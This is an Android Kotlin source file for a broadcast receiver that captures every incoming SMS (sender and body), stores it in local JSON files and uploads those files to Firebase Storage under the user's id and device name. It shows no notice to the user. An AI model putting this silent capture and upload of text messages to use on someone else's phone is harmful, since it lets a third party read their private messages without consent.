package com.reas.settings.service.SMS

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.telephony.SmsMessage
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.io.FileWriter
import java.util.*
import kotlin.collections.ArrayList


class SMSBroadcastReceiver: BroadcastReceiver() {
    var smsMessages = HashMap<String, ArrayList<SMSBaseObject>>()

    // conversation only shows the number and the last message
    var conversation: SortedMap<String, SMSBaseObject>? = null
    lateinit var jsonFile: File
    lateinit var sortedFile: File


    @RequiresApi(Build.VERSION_CODES.O)
    override fun onReceive(context: Context, intent: Intent) {
        val smsDirectory = context.getExternalFilesDir(null).toString() + "/SMS.json"
        val conversationDirectory = context.getExternalFilesDir(null).toString() + "/Conversation.json"

        jsonFile = File(smsDirectory)
        sortedFile = File(conversationDirectory)

        if (!sortedFile.exists()) sortedFile.createNewFile()


        smsMessages = loadJson()


        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            var bundle = intent.extras

            try {
                if (bundle != null) {
                    val pdus = bundle["pdus"] as Array<Any>

                    for (i in pdus.indices) {
                        var smsMessage: SmsMessage
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            smsMessage = SmsMessage.createFromPdu(pdus[i] as ByteArray, bundle.getString("format"))
                        } else smsMessage = SmsMessage.createFromPdu(pdus[i] as ByteArray)

                        var msgFrom = smsMessage.displayOriginatingAddress
                        var msgBody = smsMessage.messageBody
                        var msgTime = System.currentTimeMillis()

                        var smsBaseObject = SMSBaseObject(msgBody, msgTime, "Incoming")

                        // Checks if there are existing messages from the same address
                        if (smsMessages.containsKey(msgFrom)) {

                            smsMessages.get(msgFrom)?.add(smsBaseObject)

                        } else {

                            var smsBaseArray = ArrayList<SMSBaseObject>()
                            smsBaseArray.add(smsBaseObject)

                            smsMessages.put(msgFrom, smsBaseArray)
                        }

                        conversation = sortHashMap(smsMessages)

                        saveResponses()

                    }
                    }


                } catch (e: Exception) {
                Log.d("Exception", "onReceive: ${e.message}")
            }
            }
        }

    fun loadJson(): HashMap<String, ArrayList<SMSBaseObject>> {
        // Loads JSON File to ArrayList<SMSObject>
        var temp = HashMap<String, ArrayList<SMSBaseObject>>()

        val fileReader = FileReader(jsonFile)
        val bufferedReader = BufferedReader(fileReader)
        val stringBuilder = StringBuilder()
        var line = bufferedReader.readLine()
        while (line != null) {
            stringBuilder.append(line).append("\n")
            line = bufferedReader.readLine()
        }
        bufferedReader.close()
        val response = stringBuilder.toString()

        if (response != "") {
            val type = object : TypeToken<HashMap<String, ArrayList<SMSBaseObject>>>() {}.type
            temp = Gson().fromJson<HashMap<String, ArrayList<SMSBaseObject>>>(response, type)
        }
        return temp
    }

    private fun saveResponses() {
        val smsWriter = FileWriter(jsonFile)
        Gson().toJson(smsMessages, smsWriter)
        smsWriter.close()

        val conversationWriter = FileWriter(sortedFile)
        Gson().toJson(conversation, conversationWriter)
        conversationWriter.close()

        updateFirebase()
    }

    private fun updateFirebase() {
        val storage = Firebase.storage
        val storageRef = storage.reference

        val deviceDevice = Build.DEVICE
        val auth = FirebaseAuth.getInstance()

        val smsJsonRef = storageRef.child("users/${auth.uid}/$deviceDevice/SMS.json")
        val conversationJsonRef = storageRef.child("users/${auth.uid}/$deviceDevice/Conversation.json")

        var smsFile = Uri.fromFile(jsonFile)
        var convFile = Uri.fromFile(sortedFile)

        smsJsonRef.putFile(smsFile).addOnSuccessListener {
            Log.d("Firebase", "updateFirebase: SMS File uploaded")
        }.addOnFailureListener {
            smsJsonRef.putFile(smsFile)
        }

        conversationJsonRef.putFile(convFile).addOnSuccessListener {
            Log.d("Firebase", "updateFirebase: Conversation File uploaded")
        }.addOnFailureListener{
            conversationJsonRef.putFile(convFile)
        }

    }

    private fun sortHashMap(hashMap: HashMap<String, java.util.ArrayList<SMSBaseObject>>): SortedMap<String, SMSBaseObject> {
        val output: HashMap<String, SMSBaseObject> = HashMap<String, SMSBaseObject>()
        hashMap.forEach {
            val key = it.key
            val array = it.value
            val smsBaseObject = array[array.size - 1]
            output[key] = smsBaseObject
        }

        return output.toSortedMap(compareByDescending { output[it]?.getTime() })
    }

    }
